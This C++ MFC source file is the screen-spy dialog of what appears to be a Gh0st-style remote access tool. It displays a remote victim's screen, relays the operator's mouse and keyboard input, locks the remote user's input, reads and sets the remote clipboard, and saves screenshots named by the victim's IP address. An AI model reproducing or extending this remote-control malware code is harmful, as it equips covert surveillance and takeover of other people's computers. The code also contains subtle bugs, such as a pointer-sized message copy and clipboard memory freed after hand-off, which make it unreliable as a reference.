// ScreenSpyDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include "Common.h"

// CScreenSpyDlg 对话框
#define ALGORITHM_DIFF 1
IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent /*=NULL*/,
	IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(IDD_DIALOG_SCREEN_SPY, pParent)
{
	m_IocpServer = IOCPServer;
	m_ContextObject = ContextObject;

	char szFullPath[MAX_PATH] = { 0 };
	//获得system32目录
	GetSystemDirectory(szFullPath, MAX_PATH);
	lstrcat(szFullPath, "\\shell32.dll");
	//获得图标
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szFullPath, 17);
	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance, IDC_ARROW);

	//获得客户端IP地址
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int ulClientAddrLen = sizeof(sockaddr_in);
	BOOL bOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddr, &ulClientAddrLen);

	m_strClientIP = bOk != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";

	m_bIsFirst = TRUE;
	m_ulHScrollPos = 0; 
	m_ulVScrollPos = 0;

	//获得Bitmap的长度
	ULONG ulBitmapInforLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
	m_BitmapInfor_Full = (BITMAPINFO*)new BYTE[ulBitmapInforLength];
	//得数据
	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1),
		ulBitmapInforLength);

	m_bIsCtrl = FALSE;
	m_bIsTraceCursor = FALSE;
	SendNext();

}

CScreenSpyDlg::~CScreenSpyDlg()
{
}

VOID CScreenSpyDlg::SendNext()
{
	BYTE	bToken = COMMAND_NEXT;
	m_IocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);
}

VOID CScreenSpyDlg::OnReceiveComplete()
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
	{
		case TOKEN_FIRSTSCREEN:
		{
			DrawFirstScreen();
			break;
		}
		case TOKEN_NEXTSCREEN:
		{

			if (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[1] == ALGORITHM_DIFF)
			{
				DrawNextScreenDiff();
			}
			break;
		}
		case TOKEN_CLIPBOARD_TEXT:
		{
			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
			break;
		}
		default:
			break;
	}
}
VOID CScreenSpyDlg::UpdateServerClipboard(char* szBuffer, ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GPTR, ulLength);
	if (hGlobal != NULL)
	{
		char* szClipboardVirtualAddress = (LPTSTR)GlobalLock(hGlobal);
		memcpy(szClipboardVirtualAddress, szBuffer, ulLength);
		GlobalUnlock(hGlobal);
		SetClipboardData(CF_TEXT, hGlobal);
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}
VOID CScreenSpyDlg::DrawFirstScreen()
{
	m_bIsFirst = FALSE;

	memcpy(m_BitmapData_Full,
		m_ContextObject->InDeCompressedBuffer.GetBuffer(1),
		m_BitmapInfor_Full->bmiHeader.biSizeImage - 1);

	PostMessageA(WM_PAINT);
}

VOID CScreenSpyDlg::DrawTipString(CString strString)
{
	RECT Rect;
	GetClientRect(&Rect);

	// COLORREF用来描绘一个RGB颜色
	COLORREF  BackgroundColor = RGB(0x00, 0x00, 0x00);
	COLORREF  OldBackgroundColor = SetBkColor(m_FullDC, BackgroundColor);
	COLORREF  OldTextColor = SetTextColor(m_FullDC, RGB(0xff, 0x00, 0x00));
	//ExtTextOut函数可以提供一个可供选择的矩形，用当前选择的字体、背景颜色和正文颜色来绘制一个字符串
	ExtTextOut(m_FullDC, 0, 0, ETO_OPAQUE, &Rect, NULL, 0, NULL);

	DrawText(m_FullDC, strString, - 1, &Rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_FullDC, BackgroundColor);
	SetTextColor(m_FullDC, OldBackgroundColor);
}

VOID CScreenSpyDlg::DrawNextScreenDiff()
{
	BOOL bChange = FALSE;
	ULONG ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE);
	LPVOID FirstScreenData = m_BitmapData_Full;
	LPVOID NextScreenData = m_ContextObject->InDeCompressedBuffer.GetBuffer(ulHeadLength);

	ULONG NextScreenLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength()
		- ulHeadLength;

	POINT OldClientCursorPos;
	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
	memcpy(&m_ClientCursorPos, m_ContextObject->InDeCompressedBuffer.GetBuffer(2),
		sizeof(POINT));
	//比较是不是改变了
	if (memcmp(&OldClientCursorPos,&m_ClientCursorPos,sizeof(POINT)) != 0)
	{
		bChange = TRUE;
	}
	if (NextScreenLength > 0)
	{
		bChange = TRUE;
	}
	__asm
	{
		mov ebx, [NextScreenLength]   //ebx 16  
		mov esi, [NextScreenData]
		jmp	CopyEnd
CopyNextBlock :
		mov edi, [FirstScreenData]
		lodsd	            // 把lpNextScreen的第一个双字节，放到eax中,就是DIB中改变区域的偏移
		add edi, eax	// lpFirstScreen偏移eax	
		lodsd           // 把lpNextScreen的下一个双字节，放到eax中, 就是改变区域的大小
		mov ecx, eax
		sub ebx, 8      // ebx 减去 两个dword
		sub ebx, ecx    // ebx 减去DIB数据的大小
		rep movsb
CopyEnd :
		cmp ebx, 0 // 是否写入完毕
		jnz CopyNextBlock
	}

	if (bChange)
	{
		PostMessageA(WM_PAINT);
	}
}

BOOL CScreenSpyDlg::SaveSnapshot()
{
	//组合文件名
	CString strFileName = m_strClientIP + 
		CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");

	CFileDialog Dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);

	if (Dlg.DoModal()!= IDOK)
	{
		return FALSE;
	}
	BITMAPFILEHEADER	BitMapFileHeader;
	LPBITMAPINFO		BitMapInfor = m_BitmapInfor_Full;

	CFile File;
	if (!File.Open(Dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		return FALSE;
	}
	int nBmiSize = sizeof(BITMAPINFO);
	BitMapFileHeader.bfType = ((WORD)('M' << 8) | 'B');
	BitMapFileHeader.bfSize = BitMapInfor->bmiHeader.biSizeImage;
	BitMapFileHeader.bfReserved1 = 0;
	BitMapFileHeader.bfReserved2 = 0;
	BitMapFileHeader.bfOffBits = sizeof(BitMapFileHeader) + nBmiSize;


	File.Write(&BitMapFileHeader, sizeof(BitMapFileHeader));
	File.Write(BitMapInfor, nBmiSize);
	File.Write(m_BitmapData_Full, BitMapInfor->bmiHeader.biSizeImage);
	File.Close();
	return TRUE;
}

VOID CScreenSpyDlg::SendCommand(MSG * Msg)
{
	if (!m_bIsCtrl)
	{
		return;
	}
	LPBYTE szBuffer = new BYTE[sizeof(Msg) + 1];
	szBuffer[0] = COMMAND_SCREEN_CONTROL;
	memcpy(szBuffer + 1, Msg, sizeof(Msg));
	m_IocpServer->OnClientPreSending(m_ContextObject, szBuffer, sizeof(Msg) + 1);
	delete[] szBuffer;
}

VOID CScreenSpyDlg::SendServerClipboard()
{
	//打开剪切板设备
	if (!::OpenClipboard(NULL))
	{
		return;
	}

	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);

	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}

	int iBufferLength = GlobalSize(hGlobal) + 1;
	char* szClipboardVirtualAddress = (LPSTR)GlobalLock(hGlobal);

	LPBYTE szBuffer = new BYTE[iBufferLength];
	szBuffer[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iBufferLength - 1);
	::GlobalUnlock(hGlobal);
	::CloseClipboard();
	m_IocpServer->OnClientPreSending(m_ContextObject,(PBYTE)szBuffer, iBufferLength);
	delete[] szBuffer;
}
void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CScreenSpyDlg 消息处理程序


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, FALSE);
	CString strString;
	//设置窗口的标题
	strString.Format("\\\\%s 远程桌面控制 %d×%d",
		m_strClientIP, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
	SetWindowText(strString);


	m_FullDC = ::GetDC(m_hWnd);
	m_hFullMemDC = CreateCompatibleDC(m_FullDC);
	m_BitmapHandle = CreateDIBSection(m_FullDC, m_BitmapInfor_Full,
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);   //创建应用程序可以直接写入的、与设备无关的位图


	
	SelectObject(m_hFullMemDC, m_BitmapHandle);
		//指定滚动条范围的最小值和最大值
	SetScrollRange(SB_HORZ, 0, m_BitmapInfor_Full->bmiHeader.biWidth);  
	SetScrollRange(SB_VERT, 0, m_BitmapInfor_Full->bmiHeader.biHeight);//1366  768

	//设置菜单
	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪被控端鼠标(&T)");
		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定被控端鼠标和键盘(&L)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		SysMenu->AppendMenu(MF_SEPARATOR);

	}


	m_bIsCtrl = FALSE;   //不是控制
	m_bIsTraceCursor = FALSE;  //不是跟踪
	m_ClientCursorPos.x = 0;
	m_ClientCursorPos.y = 0;

	//SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
					   // TODO: 在此处添加消息处理程序代码
					   // 不为绘图消息调用 CDialog::OnPaint()

	if (m_bIsFirst)
	{
		DrawTipString("请等待...........");
		return;
	}
	BitBlt(m_FullDC, 0, 0,
		m_BitmapInfor_Full->bmiHeader.biWidth,
		m_BitmapInfor_Full->bmiHeader.biHeight,
		m_hFullMemDC,
		m_ulHScrollPos,
		m_ulVScrollPos,
		SRCCOPY
	);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_FullDC,
			m_ClientCursorPos.x - m_ulHScrollPos,
			m_ClientCursorPos.y - m_ulVScrollPos,
			m_hIcon,
			//m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)0 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,
			0,
			NULL,
			DI_NORMAL | DI_COMPAT
		);
}


void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CMenu* Menu = GetSystemMenu(FALSE);
	switch (nID)
	{
		case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			break;

		}
		case IDM_SAVEDIB:
		{
			//保存当前位图
			SaveSnapshot();
			break;
		}
		// 跟踪被控端鼠标
		case IDM_TRACE_CURSOR:
		{
			m_bIsTraceCursor = !m_bIsTraceCursor;
			//在菜单中打钩
			Menu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
			OnPaint();
			break;
		}
		case IDM_BLOCK_INPUT:
		{
			BOOL bIsChecked = Menu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			Menu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE bToken[2] = { 0 };
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_IocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));
			break;
		}
		case IDM_GET_CLIPBOARD:
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_IocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));
			break;
		}
		case IDM_SET_CLIPBOARD:         
		{
			SendServerClipboard();
			break;
		}

		default:
			break;
	}
	CDialog::OnSysCommand(nID, lParam);
}


BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类

#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)
	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
	{
		MSG	Msg;
		memcpy(&Msg, pMsg, sizeof(MSG));
		Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
		Msg.pt.x += m_ulHScrollPos;
		Msg.pt.y += m_ulVScrollPos;
		SendCommand(&Msg);
		break;
	}
	
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
	{
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	}
		
	}
	return CDialog::PreTranslateMessage(pMsg);
}
